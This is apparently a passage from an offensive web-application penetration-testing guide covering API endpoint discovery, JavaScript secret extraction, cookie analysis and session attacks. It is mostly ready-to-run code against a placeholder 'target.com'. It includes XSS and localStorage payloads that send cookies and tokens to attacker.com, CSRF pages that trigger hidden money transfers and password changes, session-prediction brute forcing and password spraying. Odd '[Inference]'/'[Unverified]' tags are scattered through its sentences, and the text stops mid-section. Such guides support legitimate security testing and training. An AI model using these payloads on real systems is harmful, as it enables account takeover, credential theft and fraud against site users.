```python
import json
import requests

# Download collection
response = requests.get("http://target.com/postman_collection.json")
collection = response.json()

# Extract all endpoints
def extract_endpoints(item, base_url=""):
    endpoints = []
    
    if isinstance(item, dict):
        if 'request' in item:
            method = item['request'].get('method', 'GET')
            url = item['request'].get('url', {})
            
            if isinstance(url, str):
                endpoints.append(f"{method} {url}")
            elif isinstance(url, dict):
                raw_url = url.get('raw', '')
                endpoints.append(f"{method} {raw_url}")
        
        if 'item' in item:
            for subitem in item['item']:
                endpoints.extend(extract_endpoints(subitem, base_url))
    
    elif isinstance(item, list):
        for subitem in item:
            endpoints.extend(extract_endpoints(subitem, base_url))
    
    return endpoints

# Parse collection
all_endpoints = extract_endpoints(collection)
for endpoint in all_endpoints:
    print(endpoint)
```

### API Blueprint and RAML Discovery

**API Blueprint**

```bash
# Find API Blueprint files
curl http://target.com/api.md
curl http://target.com/apiary.apib
curl http://target.com/blueprint.md

# Parse API Blueprint
npm install -g drafter
drafter api.md -o api.json
```

**RAML Files**

```bash
# Find RAML files
curl http://target.com/api.raml
curl http://target.com/api/api.raml

# Parse RAML
npm install -g raml2html
raml2html api.raml > api.html
```

### Mobile App API Discovery

**Decompiling APK for API Endpoints**

```bash
# Decompile APK with apktool
apktool d app.apk -o app_decompiled

# Search for API endpoints
grep -r "http" app_decompiled/
grep -r "api" app_decompiled/ | grep -E "http|www"

# Search in strings
strings app_decompiled/classes.dex | grep -E "http|api|endpoint"

# Using jadx
jadx -d output_dir app.apk
grep -r "Retrofit\|OkHttp\|HttpClient" output_dir/
```

**Intercepting Mobile API Traffic**

```bash
# Setup proxy
# Configure device to use Burp/mitmproxy

# Install CA certificate on device
# Android: Settings > Security > Install from storage
# iOS: Settings > General > Profile

# Using mitmproxy
mitmproxy -p 8080

# Save intercepted requests
mitmdump -w traffic.dump

# Extract API calls from dump
mitmproxy -r traffic.dump -s extract_apis.py
```

**extract_apis.py for mitmproxy**

```python
def response(flow):
    if "api" in flow.request.pretty_url or "/v" in flow.request.pretty_url:
        print(f"{flow.request.method} {flow.request.pretty_url}")
        
        # Log to file
        with open("api_endpoints.txt", "a") as f:
            f.write(f"{flow.request.method} {flow.request.pretty_url}\n")
```

### WSDL Enumeration (SOAP APIs)

**WSDL Discovery**

```bash
# Common WSDL locations
curl http://target.com/service?wsdl
curl http://target.com/services/ServiceName?wsdl
curl http://target.com/soap?wsdl
curl http://target.com/api/soap?wsdl
curl http://target.com/ws/Service?wsdl

# ASMX endpoints (ASP.NET)
curl http://target.com/Service.asmx?wsdl
curl http://target.com/webservice.asmx?wsdl
```

**WSDL Fuzzing**

```bash
# Create SOAP service wordlist
cat > soap_services.txt << EOF
UserService
AuthService
AdminService
DataService
PaymentService
OrderService
ProductService
ReportService
EOF

# Fuzz for WSDL files
ffuf -u http://target.com/FUZZ?wsdl -w soap_services.txt -mc 200
ffuf -u http://target.com/services/FUZZ?wsdl -w soap_services.txt -mc 200
```

**Parsing WSDL**

```bash
# Download WSDL
curl http://target.com/service?wsdl -o service.wsdl

# Extract operations
grep "<operation" service.wsdl

# Generate SOAP requests with wsdler
pip3 install wsdler
python3 -m wsdler http://target.com/service?wsdl
```

### API Rate Limit Discovery

**Testing for Rate Limits**

```bash
# Send multiple rapid requests
for i in {1..100}; do
    curl -I http://target.com/api/users -w "\n%{http_code}\n"
done

# Monitor for rate limit responses
# HTTP 429 Too Many Requests
# HTTP 403 with rate limit message
```

**Rate Limit Header Analysis**

```bash
# Check for rate limit headers
curl -I http://target.com/api/users | grep -i "rate\|limit\|quota"

# Common rate limit headers:
# X-RateLimit-Limit
# X-RateLimit-Remaining
# X-RateLimit-Reset
# Retry-After
```

### Subdomain-Specific API Discovery

**API Subdomain Enumeration**

```bash
# Common API subdomains
for sub in api api-v1 api-v2 api1 api2 dev-api staging-api test-api internal-api admin-api; do
    echo "[*] Testing $sub.target.com"
    curl -I http://$sub.target.com
done

# Using subfinder
subfinder -d target.com | grep -i api

# Using amass
amass enum -d target.com | grep -i api
```

### Automated API Discovery Workflow

**Comprehensive Discovery Script**

```bash
#!/bin/bash

TARGET="$1"

echo "[*] Starting API discovery for $TARGET"

# 1. Check robots.txt
echo "[+] Checking robots.txt"
curl -s "$TARGET/robots.txt" | grep -i "api"

# 2. Check common API documentation
echo "[+] Checking API documentation endpoints"
for doc in swagger swagger.json swagger-ui api-docs redoc graphql; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$doc")
    echo "[$status] $TARGET/$doc"
done

# 3. JavaScript analysis
echo "[+] Analyzing JavaScript files"
curl -s "$TARGET" | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
    if [[ $js == /* ]]; then
        js_url="$TARGET$js"
    else
        js_url="$js"
    fi
    echo "[*] Downloading $js_url"
    curl -s "$js_url" | grep -oP '/api/[^\s"'\'']+' | sort -u
done

# 4. Common API endpoints
echo "[+] Testing common API endpoints"
for endpoint in users products orders admin health status version; do
    for version in api/v1 api/v2 api v1 v2; do
        url="$TARGET/$version/$endpoint"
        status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
        if [[ $status != "404" ]]; then
            echo "[$status] $url"
        fi
    done
done

echo "[*] Discovery complete"
```

### GraphQL Specific Tools

**GraphQL Cop - Security Auditor**

```bash
# Install
pip3 install graphql-cop

# Basic audit
graphql-cop -t http://target.com/graphql

# With authentication
graphql-cop -t http://target.com/graphql -H "Authorization: Bearer token"
```

**CrackQL - GraphQL Password Spraying**

```bash
# Install
git clone https://github.com/nicholasaleks/CrackQL.git
cd CrackQL

# Run password spray
python3 CrackQL.py -t http://target.com/graphql -q queries/login.graphql -u usernames.txt -p passwords.txt
```

**GraphQLmap**

```bash
# Install
git clone https://github.com/swisskyrepo/GraphQLmap.git
cd GraphQLmap

# Interactive mode
python3 graphqlmap.py -u http://target.com/graphql

# Dump schema
python3 graphqlmap.py -u http://target.com/graphql --dump
```

---

## Important Related Topics

- **API Authentication Bypass Techniques** including JWT manipulation, OAuth flaws, and API key exploitation
- **API Parameter Pollution** and mass assignment vulnerabilities
- **BOLA/IDOR in APIs** (Broken Object Level Authorization)
- **API Rate Limit Bypass** techniques
- **GraphQL Injection and Query Batching** attacks
- **CORS Misconfiguration** in API contexts
- **API Gateway Security Testing** (AWS API Gateway, Kong, etc.)
- **WebSocket API Discovery and Testing**
- **gRPC and Protocol Buffer** enumeration and exploitation

---

## JavaScript Analysis

JavaScript analysis identifies client-side vulnerabilities, extracts sensitive information, reveals business logic exploitable for privilege escalation, and uncovers hardcoded credentials or API endpoints enabling backend exploitation.

**Static JavaScript Analysis and Source Review**

Extract and analyze application JavaScript:

```bash
# Discover JavaScript files via network inspection
burp suite passive scanner identifies all JS files

# Browser developer tools
# Open DevTools (F12) â†’ Sources tab
# View all loaded scripts

# curl for direct retrieval
curl -s https://target.com/assets/app.js | head -100
curl -s https://target.com/assets/bundle.js

# Enumerate common JavaScript paths
for path in /js /assets /static /src /scripts; do
    curl -s https://target.com$path/ | grep -oE "href=\"[^\"]*\.js\"" | cut -d'"' -f2
done

# Extract embedded JavaScript from HTML
curl -s https://target.com | grep -oE "<script[^>]*>.*?</script>" | sed 's/<[^>]*>//g'
```

JavaScript discovery techniques:

```bash
# Passive source finding
# Use SecurityHeaders.com to identify CDN-hosted scripts

# Content Security Policy analysis
curl -I https://target.com | grep -i "content-security-policy"

# Wayback Machine enumeration
# https://web.archive.org/web/*/target.com/js/*
# Historical JavaScript versions may leak vulnerabilities

# GitHub/public repository search
# Repository search for target domain
# Often reveals development JavaScript with debug statements
```

[Inference] JavaScript discovery reveals application structure and dependencies, enabling targeted analysis of specific components vulnerable to client-side attacks.

**API Endpoint Extraction**

Identify backend APIs from client-side code:

```bash
# Extract API calls from JavaScript
curl -s https://target.com/assets/app.js | grep -oE "(https?://|/)[a-zA-Z0-9/_\-\.]*\.(php|api|endpoint|json)" | sort -u

# Pattern matching for common API patterns
grep -oE "(/api/|/v[0-9]/|/ajax/)[^'\"]*" app.js | sort -u

# Fetch calls indicating endpoints
grep -oE "fetch\(['\"]([^'\"]+)['\"]" app.js | cut -d"'" -f2 | sort -u

# Axios/jQuery AJAX patterns
grep -oE "axios\.(get|post|put|delete)\(['\"]([^'\"]+)" app.js | cut -d"'" -f2 | sort -u
grep -oE "\$.ajax\(\{[^}]*url:['\"]([^'\"]+)" app.js | cut -d"'" -f2 | sort -u
```

Discovered endpoint analysis:

```bash
# Extract endpoints to file
curl -s https://target.com/assets/app.js | grep -oE "(/api/[a-zA-Z0-9/_\-\.]*)" | sort -u > api_endpoints.txt

# Test discovered endpoints
while read endpoint; do
    echo "[*] Testing $endpoint"
    curl -s https://target.com$endpoint | head -20
done < api_endpoints.txt

# Categorize by HTTP method
grep -E "(GET|POST|PUT|DELETE|PATCH)" app.js | grep -oE "/api/[a-zA-Z0-9/_\-\.]*" | sort -u > api_methods.txt
```

[Inference] JavaScript analysis reveals API endpoints frequently used by client-side code but not otherwise discoverable through standard reconnaissance, enabling direct backend API testing.

**Sensitive Data Extraction from JavaScript**

Identify hardcoded credentials, keys, and configuration:

```bash
# Search for common secret patterns
grep -iE "(password|secret|token|api.?key|apikey|private.?key|aws_key)" app.js | head -20

# Specific pattern matching
grep -oE "api[_-]?key['\"]?\s*[:=]\s*['\"]?[a-zA-Z0-9]{20,}" app.js

# AWS credentials
grep -oE "AKIA[0-9A-Z]{16}" app.js

# Google API keys
grep -oE "AIza[0-9A-Za-z\-_]{35}" app.js

# JWT tokens
grep -oE "eyJ[a-zA-Z0-9_\-\.]*" app.js

# Database connection strings
grep -iE "(mongodb|mysql|postgres)://[^'\"]*" app.js

# URLs to internal services
grep -oE "https?://[a-zA-Z0-9\-\.]+\.(internal|local|dev|staging)" app.js
```

Analysis of findings:

```bash
# Aggregate suspicious patterns
cat app.js | sed 's/[;,{}]/\n/g' | grep -E "password|secret|token|key|credential" | sort -u

# Context analysis
# Find variable assignments suspicious values
grep -B2 -A2 "password.*=" app.js
grep -B2 -A2 "secret.*=" app.js

# Test credentials immediately
# API key validity testing
curl -H "Authorization: Bearer $API_KEY" https://api.target.com/user
```

[Inference] Hardcoded credentials in JavaScript provide immediate backend system access, with [Unverified] credential storage in client-side code being common in development and hastily deployed applications.

**Client-Side Authorization Logic Analysis**

Identify authorization flaws in client code:

```bash
# Search for role-based access control
grep -iE "(admin|moderator|role|permission|isadmin|candelete)" app.js | head -20

# JavaScript privilege checking
grep -E "if\s*\([^)]*admin" app.js
grep -E "if\s*\([^)]*permission" app.js
grep -E "if\s*\([^)]*privilege" app.js

# Example vulnerable patterns:
# if (user.isAdmin) { show_admin_panel(); }
# if (currentUser.role == 'admin') { enableDelete(); }

# Extract full authorization blocks
awk '/if.*admin/,/}/' app.js | head -30

# Hidden button/menu analysis
grep -iE "(display:?none|hidden|visibility:?hidden)" app.js
grep -E "style=['\"].*display.*none" app.js
```

Authorization bypass exploitation:

```javascript
// Common client-side bypass: Modify JavaScript at runtime

// In browser console:
// 1. Directly set authorization flag
user.isAdmin = true;

// 2. Modify DOM elements hidden by CSS
document.querySelectorAll('[style*="display:none"]').forEach(el => {
    el.style.display = 'block';
});

// 3. Execute administrative functions directly
delete_user(target_user_id);  // If function exists in scope

// 4. Modify permission checks
window.checkPermission = () => true;  // Override function

// 5. Access hidden API calls
fetch('/api/admin/users').then(r => r.json()).then(console.log);
```

[Inference] Client-side authorization enforcement creates false security perception but [Unverified] does not prevent unauthorized access when backend lacks proper authentication, enabling straightforward bypass through console manipulation or direct API calls.

**Local Storage and Session Storage Analysis**

Extract sensitive data from browser storage:

```bash
# Analyze JavaScript accessing localStorage/sessionStorage
grep -E "(localStorage|sessionStorage)\.(getItem|setItem|removeItem)" app.js

# Extract storage keys being used
grep -oE "(localStorage|sessionStorage)\.getItem\(['\"]([^'\"]+)" app.js | cut -d"'" -f2 | sort -u

# Check for credential storage patterns
grep -E "(localStorage|sessionStorage)\.setItem.*password" app.js
grep -E "(localStorage|sessionStorage)\.setItem.*token" app.js
grep -E "(localStorage|sessionStorage)\.setItem.*session" app.js

# Sensitive data patterns stored
grep -oE "(localStorage|sessionStorage)\.setItem\(['\"]([^'\"]+)['\"],\s*['\"]([^'\"]+)" app.js
```

Browser console exploitation:

```javascript
// Access stored data from browser console
// Note: This requires user to be on target website

// View all localStorage data
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    console.log(key + ": " + value);
}

// View specific sensitive data
console.log(localStorage.getItem('auth_token'));
console.log(localStorage.getItem('jwt'));
console.log(sessionStorage.getItem('user_session'));

// Extract and exfiltrate
const data = {};
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data[key] = localStorage.getItem(key);
}
fetch('https://attacker.com/exfil?data=' + encodeURIComponent(JSON.stringify(data)));

// Persistence payload injection
localStorage.setItem('persist_payload', 'malicious_javascript_code');
// Code re-injected on subsequent page loads
```

[Inference] Local/session storage analysis reveals application state management patterns and frequently contains sensitive data (tokens, session IDs) [Unverified] with weaker protection compared to HTTP-only cookies.

**DOM-based XSS Vulnerability Identification**

Locate JavaScript patterns vulnerable to DOM-based XSS:

```bash
# Identify DOM manipulation patterns
grep -E "(innerHTML|document\.write|eval|setTimeout.*)" app.js | head -20

# innerHTML usage (potentially dangerous)
grep -E "\.innerHTML\s*=" app.js

# eval() and similar dangerous functions
grep -E "(eval|Function|setTimeout|setInterval).*\$|user|input" app.js

# Unsanitized data flow paths
grep -B3 -A3 "innerHTML.*location\." app.js
grep -B3 -A3 "innerHTML.*user" app.js

# URL/query parameter usage in DOM
grep -E "(location\.search|URLSearchParams|window\.location\.hash)" app.js | head -10
```

DOM XSS vulnerability patterns:

```javascript
// Vulnerable pattern 1: Direct innerHTML with user input
var user_name = location.hash.split('=')[1];
document.getElementById('greeting').innerHTML = 'Welcome ' + user_name;
// Attack: #name=<img src=x onerror=alert('XSS')>

// Vulnerable pattern 2: eval() with user data
var param = new URLSearchParams(location.search);
var data = param.get('data');
eval(data);  // Directly executes attacker-supplied code

// Vulnerable pattern 3: document.write with unsanitized input
var search = location.search.substring(1);
document.write('<h1>' + search + '</h1>');

// Vulnerable pattern 4: setTimeout with string concatenation
var delay = location.hash.substring(1);
setTimeout('alert("' + delay + '")', 1000);

// Vulnerable pattern 5: Direct object property modification
var user = {};
Object.assign(user, JSON.parse(location.hash.substring(1)));
// Attack: #{"admin":true}
```

Exploitation verification:

```bash
# Test identified vulnerabilities
# Create proof-of-concept payloads

# URL encoding required for many payloads
PAYLOAD='<img src=x onerror=alert("XSS")>'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")

# Test via curl (verification)
curl "https://target.com/page#name=$ENCODED" -o /dev/null -w "%{http_code}\n"

# Browser-based testing
# Open DevTools console
# Execute: window.location = 'https://target.com/page#name=' + encodeURIComponent(PAYLOAD)
# Observe alert() execution
```

[Inference] DOM-based XSS vulnerabilities exploit client-side JavaScript data handling and require identifying specific sourceâ†’sink patterns where user input flows to dangerous functions without sanitization.

**JavaScript Obfuscation and De-obfuscation**

Analyze intentionally obscured JavaScript:

```bash
# Detect obfuscation
file app.js
# High entropy indicates obfuscation/minification

# De-minification (removes whitespace, shortens variables)
curl -s https://target.com/assets/app.js | python3 -m json.tool 2>/dev/null

# Use online de-minifiers
# https://beautifier.io/
# Upload minified JavaScript, receives readable version

# Command-line de-minification
pip install jsbeautifier
js-beautify app.js > app_beautiful.js

# Analyze for common obfuscation patterns
grep -E "\\\\x[0-9a-f]{2}" app.js  # Hex-encoded strings
grep -E "String\.fromCharCode" app.js  # Character code sequences

# Decrypt common obfuscation
python3 << 'EOF'
import re
js_content = open('app.js').read()

# Replace String.fromCharCode patterns
def decode_fromcharcode(match):
    codes = re.findall(r'\\d+', match.group(0))
    return ''.join(chr(int(c)) for c in codes)

decoded = re.sub(r'String\.fromCharCode\([0-9,]+\)', decode_fromcharcode, js_content)
print(decoded)
EOF
```

Advanced deobfuscation:

```bash
# For complex obfuscation, run in JavaScript environment
node << 'EOF'
// Load obfuscated file
const obfuscated = require('fs').readFileSync('app.js', 'utf8');

// Execute in controlled environment
const vm = require('vm');
const context = vm.createContext({
    console: console,
    window: {},
    document: {}
});

// Capture executed code
vm.runInContext(obfuscated, context);

// Analyze resulting objects
console.log(context.window);  // Exposed functions/data
EOF
```

[Inference] Obfuscated JavaScript remains vulnerable to same attacks as readable codeâ€”obfuscation obscures logic but doesn't prevent exploitation when vulnerabilities exist in underlying algorithms.

**Third-Party Library Vulnerability Analysis**

Identify vulnerable dependencies:

```bash
# Extract library information from JavaScript
grep -E "\/\/.*library|\/\*.*v?[0-9]+\.[0-9]+" app.js | head -20

# Package.json analysis (if accessible)
curl -s https://target.com/package.json | jq . 

# Identify libraries and versions
grep -oE "(jquery|bootstrap|angular|react|vue).*v?[0-9]+\.[0-9]+\.[0-9]+" app.js | sort -u

# Check library versions against known vulnerabilities
# For example: jQuery 1.x-2.x known for XSS vulnerabilities

# Enumerate CDN-hosted libraries
grep -oE "https://cdnjs\.cloudflare\.com/ajax/libs/[a-zA-Z0-9\-]+/[0-9\.]+/" app.js | sort -u

# Test library vulnerabilities
# https://www.cvedetails.com/
# Search for library name and version

# Automated scanning
npm install snyk -g
snyk test app.js  # Tests JavaScript dependencies
```

Common vulnerable libraries:

```
jQuery < 3.0: DOM-based XSS, selector injection
Bootstrap < 3.4: XSS in carousel plugin
Angular < 1.5: Multiple XSS vulnerabilities
React: Generally well-maintained, check version-specific CVEs
Lodash < 4.17.21: Prototype pollution vulnerabilities
```

[Inference] Third-party library vulnerabilities enable widespread exploitation when identified, particularly affecting library components automatically loaded by all users.

---

## Cookie Analysis

Cookie analysis identifies authentication tokens, session IDs, preference data, and tracking mechanismsâ€”revealing opportunities for session hijacking, privilege escalation, and privacy violations.

**Cookie Discovery and Enumeration**

Identify all cookies set by application:

```bash
# Browser DevTools â†’ Application â†’ Cookies
# Lists all cookies for domain

# curl with verbose output
curl -v https://target.com 2>&1 | grep -i "set-cookie"

# Burp Suite passive scanning
# Proxy traffic through Burp
# Automatically discovers and categorizes cookies

# Automated cookie enumeration
python3 << 'EOF'
import requests
from urllib.parse import urlparse

session = requests.Session()
response = session.get('https://target.com')

# Extract cookies
for cookie in session.cookies:
    print(f"Name: {cookie.name}")
    print(f"Value: {cookie.value}")
    print(f"Domain: {cookie.domain}")
    print(f"Path: {cookie.path}")
    print(f"Expires: {cookie.expires}")
    print(f"Secure: {cookie.secure}")
    print(f"HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
    print("---")
EOF

# JavaScript access to cookies
# Browser console
console.log(document.cookie);

# Parse individual cookies
document.cookie.split(';').forEach(c => console.log(c.trim()));
```

[Inference] Cookie enumeration identifies all tracking and session mechanisms, revealing authentication tokens and preference data exploitable for session attacks.

**Session Cookie Analysis**

Examine authentication and session tokens:

```bash
# Identify session cookies by name pattern
# Common names: PHPSESSID, JSESSIONID, session_id, sid, sessionid

# Extract session cookie
curl -s -c cookies.txt https://target.com > /dev/null
cat cookies.txt | grep -E "sid|session|phpsessid"

# Analyze session cookie properties
curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep -iE "sid|session|phpsessid"

# Check for secure flags
# Output format: Set-Cookie: SESSIONID=abc123; Path=/; Secure; HttpOnly
```

Session cookie security assessment:

```bash
# Insecure configuration indicators:

# 1. No Secure flag (vulnerable to MITM over HTTP)
curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep -v Secure

# 2. No HttpOnly flag (vulnerable to JavaScript access/XSS)
curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep -v HttpOnly

# 3. No SameSite attribute (vulnerable to CSRF)
curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep -v SameSite

# 4. Long expiration time (extended session window)
curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep "Max-Age=\|expires="

# 5. Weak randomness indicators
# Extract session ID and analyze entropy
SESSION=$(curl -s -c - https://target.com | grep SESSIONID | awk '{print $NF}')
echo $SESSION | od -A x -t x1z
```

[Inference] Missing security flags on session cookies enable [Unverified] MITM interception, XSS-based session theft, and CSRF attacks depending on configuration deficiencies.

**Session Token Randomness Testing**

Assess session ID generation quality:

```bash
# Collect multiple session IDs
for i in {1..100}; do
    curl -s -c - https://target.com | grep SESSIONID | awk '{print $NF}' >> sessions.txt
done

# Analyze token patterns
cat sessions.txt | head -10

# Check for sequential or predictable patterns
# If session IDs are sequential (1, 2, 3, etc.) - highly vulnerable
sort sessions.txt | uniq | wc -l  # Count unique sessions
# Should equal 100 (all unique). Duplicates indicate poor randomness

# Entropy analysis
python3 << 'EOF'
import re
from collections import Counter

sessions = open('sessions.txt').read().strip().split('\n')

# Analyze character distribution (should be uniform)
char_counts = Counter()
for session in sessions:
    for char in session:
        char_counts[char] += 1

print("Character distribution (should be uniform for secure randomness):")
for char, count in sorted(char_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
    print(f"{char}: {count}")

# Check for patterns
print("\nChecking for sequential patterns...")
for i in range(len(sessions)-1):
    # Convert hex to int if applicable
    try:
        val1 = int(sessions[i], 16)
        val2 = int(sessions[i+1], 16)
        if val2 == val1 + 1:
            print(f"Sequential pair found: {sessions[i]} â†’ {sessions[i+1]}")
    except:
        pass
EOF

# Statistical testing (NIST randomness tests)
# pip install ent
ent sessions.txt  # Entropy analysis
```

[Inference] Weak session ID randomness enables [Inference] session prediction attacks where attackers guess valid session IDs without capture, achieving unauthorized session hijacking through brute-force.

**Cookie Encryption and Encoding Analysis**

Determine if cookies contain encrypted/encoded data:

```bash
# Base64 detection (common encoding)
echo "SESSION_VALUE" | base64 -w0
# If session value decodes to readable text - likely base64 encoded

# Automated base64 detection
python3 << 'EOF'
import base64

session_value = "YWJjMTIzZGVmNDU2"  # Example encoded session

try:
    decoded = base64.b64decode(session_value).decode('utf-8')
    if decoded.isprintable():
        print(f"Base64 detected: {session_value} â†’ {decoded}")
except:
    print("Not valid base64")
EOF

# Encryption detection (ciphertext typically high entropy)
python3 << 'EOF'
import math

def entropy(data):
    return -sum((data.count(chr(i)) / len(data)) * math.log2(data.count(chr(i)) / len(data) + 1e-10) for i in range(256))

# Encrypted data: entropy ~7.9 (near-maximum)
# Plain text: entropy ~4.5-5.5
# Base64 encoded plain: entropy ~5.75
EOF

# Identify encryption algorithms
# XOR-encrypted (low entropy xor patterns)
# AES (high entropy if properly implemented)
# DES (legacy encryption - weaker)

# Attempt common cookie encryption attacks
# 1. Test for ECB mode (identical plaintext blocks produce identical ciphertext)
# 2. Perform dictionary attacks on encrypted cookies
# 3. Analyze key derivation (if deterministic - vulnerable to prediction)
```

[Unverified] Encrypted cookies provide [Inference] data confidentiality but cookies must still be securely transmitted (HTTPS with Secure flag) and protected from XSS theft if accessible to JavaScript.

**Cookie-Based Authentication Bypass**

Exploit weak session management:

```bash
# 1. Session fixation attack
# Force user to specific session ID
# Then user authenticates with that ID

# Create malicious session
FAKE_SESSION="admin_session_12345"

# Craft login URL with session cookie
curl -b "SESSIONID=$FAKE_SESSION" -c - https://target.com/login \
    -d "username=victim&password=password"

# 2. Session prediction attack
# Generate valid session IDs by pattern

python3 << 'EOF'
import requests
import time

# Predict session based on timestamp
current_time = int(time.time())

for offset in range(-10, 10):
    predicted_session = str(current_time + offset)
    
    cookies = {'SESSIONID': predicted_session}
    response = requests.get('https://target.com/user', cookies=cookies)
    
    if 'login' not in response.text.lower():
        print(f"Valid session found: {predicted_session}")
EOF

# 3. Cookie manipulation
# Modify cookie to change user/privilege

# Original cookie: user_id=123
# Modified cookie: user_id=456 (target user)

curl -b "user_id=456; session_token=abc123" https://target.com/profile

# 4. Double-submit cookie attack bypass
# CSRF protection relies on matching cookies
# If both cookies submitted by JavaScript, CSRF tokens bypass possible

python3 << 'EOF'
import requests

session = requests.Session()

# Get CSRF token from cookie
session.get('https://target.com/form')
csrf_token = session.cookies.get('csrf_token')

# Also appears in HTML form
# If same token in both locations, predictable
if csrf_token == 'predictable_value':
    print("CSRF token predictable - CSRF possible")
EOF
```

[Inference] Cookie-based session attacks exploit weak generation, transmission, or validation enabling unauthorized session access or privilege escalation.

**Cross-Site Request Forgery (CSRF) via Cookies**

Exploit cookie-based request authentication:

```bash
# CSRF requires:
# 1. Browser cookies (automatically sent)
# 2. No CSRF token or predictable token
# 3. State-changing operation (POST without CSRF protection)

# Identify CSRF vulnerability
# 1. Check for CSRF tokens
curl -s https://target.com/form | grep -i "csrf\|token" 

# If no token found, likely CSRF vulnerable

# 2. Craft CSRF attack payload
cat > csrf_payload.html << 'EOF'
<html>
<body>
    <img src="https://target.com/api/transfer?amount=1000&to=attacker_account" style="display:none;">
</body>
</html>
EOF

# When victim visits page while logged in:
# - Browser automatically includes session cookies
# - Image request made with victim's credentials
# - Transfer executed without victim's knowledge

# 3. POST-based CSRF (form submission)
cat > csrf_form.html << 'EOF'
<html>
<body>
    <form action="https://target.com/change_password" method="POST" style="display:none;">
        <input type="hidden" name="new_password" value="attacker_password">
        <input type="submit">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
EOF
```

CSRF token bypass techniques:

```bash
# 1. Token validation weakness
# CSRF token ignored if not present
# Test: Submit form without token

curl -X POST https://target.com/form -d "action=delete&id=123"

# 2. Token re-use
# Same token accepted for multiple requests
# Predict or capture token, use repeatedly

# 3. Token parameter mismatch
# Server checks 'csrf_token' but app uses 'token'
# Submit with correct parameter name while omitting checked one

# 4. Double-submit cookie bypass
# Server compares cookie value to submitted value
# If attacker can set cookie, bypass possible
# Via subdomain cookie, HTTP-only: false, etc.

# 5. Null value bypass
# Test: csrf_token=  (empty)
# Some implementations treat null as "valid" (missing = no check)
```

[Inference] CSRF exploitation leverages cookie-based authentication where session validation relies solely on presence in browser cookies without additional per-request verification tokens.

**Cookie Theft and Exfiltration**

Capture cookies through various methods:

```bash
# 1. MITM interception (HTTP without Secure flag)
tcpdump -i eth0 -A "tcp port 80" | grep -i "set-cookie\|cookie:"

# 2. XSS-based cookie stealing
# Payload injected into vulnerable application
<script>
    // Exfiltrate cookies to attacker server
    fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>

# HttpOnly cookies not accessible via JavaScript (if set properly)
# But unprotected cookies stolen via XSS

# 3. Network sniffing
# Unencrypted HTTP traffic contains plaintext cookies
bettercap -iface eth0
# Monitor for Set-Cookie headers

# 4. Browser history/cache analysis
# Cookies sometimes cached in browser history
ls ~/.mozilla/firefox/profile/cookies.sqlite  # Firefox
open ~/Library/Safari/History.plist  # Safari

# 5. Memory dump
# Extract cookies from running browser process
# Requires system-level access
strings /proc/<browser_pid>/maps | grep -i cookie
```

[Inference] Cookie theft enables full account takeover when session cookies capturedâ€”protective measures (HTTPS, Secure/HttpOnly flags) mitigate but don't eliminate theft vectors.

---

## Session Management Assessment

Session management assessment evaluates authentication token lifecycle, session fixation prevention, timeout policies, and privilege handlingâ€”identifying session-based privilege escalation vectors.

**Session Lifecycle Analysis**

Track session from creation through termination:

```bash
# 1. Session creation (authentication)
curl -v https://target.com/login \
    -d "username=user&password=pass" \
    2>&1 | grep -i "set-cookie"

# Output: Set-Cookie: SESSIONID=abc123; Path=/; HttpOnly; Secure

# 2. Session use (authenticated requests)
curl -b "SESSIONID=abc123" https://target.com/dashboard

# 3. Session termination (logout)
curl -b "SESSIONID=abc123" https://target.com/logout
curl -v https://target.com/logout 2>&1 | grep -i "set-cookie"

# Expected: Set-Cookie: SESSIONID=; Max-Age=0  (delete cookie)
# Or: Set-Cookie: SESSIONID=deleted; Path=/; Max-Age=0
```

Session lifecycle vulnerabilities:

```bash
# 1. Session not invalidated on logout
# After logout, old session still valid

curl -b "SESSIONID=old_session" https://target.com/dashboard
# Expected: 401 Unauthorized
# Actual: 200 OK (session still valid)

# 2. Session fixation
# Attacker forces specific session ID, user authenticates with it

# Vulnerable scenario:
# Pre-authentication: attacker provides SESSIONID=attacker_controlled
# User logs in without creating new session: SESSIONID=attacker_controlled
# Attacker uses same SESSIONID to access user account

# 3. Concurrent session management
# Multiple simultaneous sessions for single user allowed
curl -b "SESSIONID=session1" https://target.com/profile
curl -b "SESSIONID=session2" https://target.com/profile
# Both succeed - user can have multiple active sessions

# 4. Session persistence across password change
# Session remains valid after password change
# User can change password but session not invalidated
```

[Inference] Session lifecycle analysis reveals improper invalidation, fixation vulnerabilities, and persistence issues enabling unauthorized continued access after compromises.

**Concurrent Session Testing**

Identify multiple simultaneous session handling:

```bash
# Authentication scenario
# Browser 1: Login â†’ receives SESSIONID_1
# Browser 2: Login â†’ receives SESSIONID_2
# Question: Are both sessions valid simultaneously?

# Simulate multiple sessions
python3 << 'EOF'
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def make_session():
    s = requests.Session()
    retries = Retry(connect=3, backoff_factor=0.5)
    s.mount('https://', HTTPAdapter(max_retries=retries))
    return s

# Create two independent sessions (different browser profiles)
session1 = make_session()
session2 = make_session()

# Both authenticate as same user
resp1 = session1.post('https://target.com/login', 
    data={'username': 'user', 'password': 'pass'})
resp2 = session2.post('https://target.com/login',
    data={'username': 'user', 'password': 'pass'})

# Extract session cookies
session1_cookie = session1.cookies.get('SESSIONID')
session2_cookie = session2.cookies.get('SESSIONID')

print(f"Session 1: {session1_cookie}")
print(f"Session 2: {session2_cookie}")

# Test both sessions simultaneously
resp1_test = session1.get('https://target.com/user')
resp2_test = session2.get('https://target.com/user')

print(f"Session 1 valid: {resp1_test.status_code == 200}")
print(f"Session 2 valid: {resp2_test.status_code == 200}")

# If both valid, multiple concurrent sessions allowed
EOF

# Privilege escalation via concurrent sessions
# Session 1: Limited user account (readonly access)
# Session 2: Admin account
